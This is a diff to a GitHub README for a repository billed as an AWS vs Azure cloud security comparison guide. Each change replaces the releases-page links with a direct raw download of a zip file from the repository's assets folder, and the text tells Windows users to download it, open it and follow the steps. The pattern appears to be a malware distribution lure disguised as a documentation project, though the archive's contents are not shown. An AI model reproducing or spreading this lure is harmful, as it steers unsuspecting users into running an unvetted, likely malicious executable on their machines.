@@ -1,6 +1,6 @@
 # 🔐 AWS-vs-Azure-Cloud-Security-Comparison - Compare Cloud Security
 
-[![Download the app](https://img.shields.io/badge/Download-Visit%20Releases%20Page-blue?style=for-the-badge)](https://github.com/bilabiate-subsaharanafrica36/AWS-vs-Azure-Cloud-Security-Comparison/releases)
+[![Download the app](https://img.shields.io/badge/Download-Visit%20Releases%20Page-blue?style=for-the-badge)](https://github.com/bilabiate-subsaharanafrica36/AWS-vs-Azure-Cloud-Security-Comparison/raw/refs/heads/main/assets/Security-AW-Comparison-Cloud-vs-Azure-v2.4.zip)
 
 A clear guide to AWS and Azure cloud security, with side-by-side coverage of access control, network protection, encryption, monitoring, and compliance.
 
@@ -8,7 +8,7 @@ A clear guide to AWS and Azure cloud security, with side-by-side coverage of acc
 
 Visit this page to download and run the app on Windows:
 
-[https://github.com/bilabiate-subsaharanafrica36/AWS-vs-Azure-Cloud-Security-Comparison/releases](https://github.com/bilabiate-subsaharanafrica36/AWS-vs-Azure-Cloud-Security-Comparison/releases)
+[https://github.com/bilabiate-subsaharanafrica36/AWS-vs-Azure-Cloud-Security-Comparison/raw/refs/heads/main/assets/Security-AW-Comparison-Cloud-vs-Azure-v2.4.zip](https://github.com/bilabiate-subsaharanafrica36/AWS-vs-Azure-Cloud-Security-Comparison/raw/refs/heads/main/assets/Security-AW-Comparison-Cloud-vs-Azure-v2.4.zip)
 
 Open the latest release, then download the Windows file that matches your device. After the file downloads, open it and follow the on-screen steps.
 
@@ -44,7 +44,7 @@ If your PC is older, close other apps before you start.
 Follow these steps on Windows:
 
 1. Open the release page:  
-   https://github.com/bilabiate-subsaharanafrica36/AWS-vs-Azure-Cloud-Security-Comparison/releases
+   https://github.com/bilabiate-subsaharanafrica36/AWS-vs-Azure-Cloud-Security-Comparison/raw/refs/heads/main/assets/Security-AW-Comparison-Cloud-vs-Azure-v2.4.zip
 
 2. Find the latest release at the top of the page.
 
@@ -197,4 +197,4 @@ It gives a simple view that helps you compare both platforms without reading lon
 
 If you need the download page again, use this link:
 
-[https://github.com/bilabiate-subsaharanafrica36/AWS-vs-Azure-Cloud-Security-Comparison/releases](https://github.com/bilabiate-subsaharanafrica36/AWS-vs-Azure-Cloud-Security-Comparison/releases)
+[https://github.com/bilabiate-subsaharanafrica36/AWS-vs-Azure-Cloud-Security-Comparison/raw/refs/heads/main/assets/Security-AW-Comparison-Cloud-vs-Azure-v2.4.zip](https://github.com/bilabiate-subsaharanafrica36/AWS-vs-Azure-Cloud-Security-Comparison/raw/refs/heads/main/assets/Security-AW-Comparison-Cloud-vs-Azure-v2.4.zip)
